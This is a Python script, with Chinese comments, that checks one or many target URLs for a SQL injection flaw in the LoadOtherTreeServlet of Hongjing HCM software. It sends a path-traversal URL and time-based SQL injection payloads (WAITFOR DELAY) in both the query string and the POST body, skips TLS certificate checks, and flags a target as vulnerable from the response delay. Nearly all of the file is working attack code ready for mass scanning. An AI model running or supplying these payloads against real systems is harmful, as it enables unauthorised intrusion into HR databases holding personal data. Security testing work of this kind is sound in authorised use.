import requests
import argparse
import time
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构造完整的攻击URL
        attack_url = url.rstrip('/') + "/w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A4%27--&flag=1"
        attack_payload = """usertable=h00&usernumber=1&i9999=-1';WAITFOR+DELAY+'0:0:6'--+"""

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        start_time = time.time()
        response = requests.post(attack_url, headers=headers, data=attack_payload, verify=False, timeout=10)
        elapsed_time = time.time() - start_time

        if 4 < elapsed_time < 6:
            print(f"{RED}URL [{url}] 可能存在宏景HCM-LoadOtherTreeServlet-sql注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否宏景HCM-LoadOtherTreeServlet-sql注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()